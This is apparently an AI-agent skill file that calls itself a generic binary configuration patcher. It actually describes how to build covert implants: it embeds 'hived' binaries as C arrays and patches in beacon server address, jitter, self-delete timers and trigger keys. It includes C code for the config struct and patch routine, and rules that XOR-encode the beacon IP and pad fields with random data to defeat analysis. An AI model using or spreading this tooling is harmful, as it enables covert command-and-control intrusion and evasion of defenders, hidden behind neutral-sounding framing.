---
name: binary-configuration-patcher
description: "Use when: embedding runtime configuration into precompiled binaries by searching for signature markers. Triggers: 'binary patch', 'config injection', 'signature search', 'offset patch', 'runtime config'. Requires: binary analysis tools. NOT for: source-based configuration, or when rebuilding is possible."
---

# Binary Configuration Patcher

## Overview

Pattern for distributing a single patcher tool that embeds platform-specific configuration into precompiled binaries. Uses `xxd -i` to embed unpatched binaries as C arrays, then patches configuration at a known signature offset.

## Architecture

```
Build Phase:
  hived-<platform>-unpatched (ELF binary)
       |
  xxd -i  (convert to C byte array)
       |
  _unpatched_<platform>.h  (C header with embedded bytes)
       |
  patcher.c (compiled with all platform headers)

Runtime Phase:
  patcher -a <beacon_ip> -k <key> -m <platform>
       |
  1. Parse args into cl_args struct
  2. XOR-encode sensitive strings
  3. For each target platform:
     a. Search for SIG_HEAD (0x7AD8CFB6) in embedded binary
     b. Handle endianness conversion if needed
     c. Overwrite configuration struct at SIG_HEAD offset
     d. Write patched binary to disk
```

## Configuration Structure

```c
struct __attribute__((packed)) cl_args {
    unsigned int   sig;              // Signature marker (0x7AD8CFB6)
    unsigned int   beacon_port;      // TLS connection port
    unsigned int   trigger_delay;    // Seconds between trigger and callback
    unsigned long  init_delay;       // Initial beacon delay
    unsigned int   interval;         // Beacon interval
    unsigned int   jitter;           // Beacon jitter percentage (0-30)
    unsigned long  delete_delay;     // Self-delete timeout
    unsigned int   patched;          // Patched flag
    unsigned char  idKey[20];        // SHA-1 implant key
    char           sdpath[128];      // Self-delete control path
    char           beacon_ip[256];   // Beacon server address
    char           dns[2][16];       // DNS server addresses
};
```

## Patching Algorithm

```c
int patch(char *filename, unsigned char *binary, unsigned int len, struct cl_args args) {
    unsigned int sig_le = SIG_HEAD;            // Little-endian signature
    unsigned int sig_be = htonl(SIG_HEAD);     // Big-endian signature
    unsigned char *p = binary;
    int big_endian = 0;

    // Search for signature
    do {
        if (memcmp(p, &sig_le, 4) == 0) break;
        if (memcmp(p, &sig_be, 4) == 0) { big_endian = 1; break; }
        p++;
    } while (p < binary + len);

    // Convert fields for big-endian targets
    if (big_endian) {
        args.sig = htonl(args.sig);
        args.beacon_port = htonl(args.beacon_port);
        // ... convert all multi-byte fields
    }

    // Overwrite configuration at signature location
    memcpy(p, &args, sizeof(struct cl_args));
    write_binary(filename, binary, len);
}
```

## Key Derivation (Double SHA-1)

```
trigger_key = SHA-1(passphrase_or_file_contents)
implant_key = SHA-1(trigger_key)
```

The implant stores `implant_key` and validates triggers against `SHA-1(received_trigger_key)`.

## Constraints

- MUST use `__attribute__((packed))` for the configuration struct to ensure consistent memory layout
- MUST handle both little-endian and big-endian targets with `htonl()` conversion
- MUST use `xxd -i` (not manual embedding) to ensure binary fidelity of embedded arrays
- ALWAYS fill unused configuration fields with random data before patching (prevents pattern analysis)
- MUST XOR-encode sensitive strings (DNS, beacon IP, self-delete path) before embedding
- SHOULD validate configuration completeness before patching (beacon IP, port, interval all present if beacons enabled)
- NEVER store the trigger key -- only the double-hashed implant key is stored in the binary
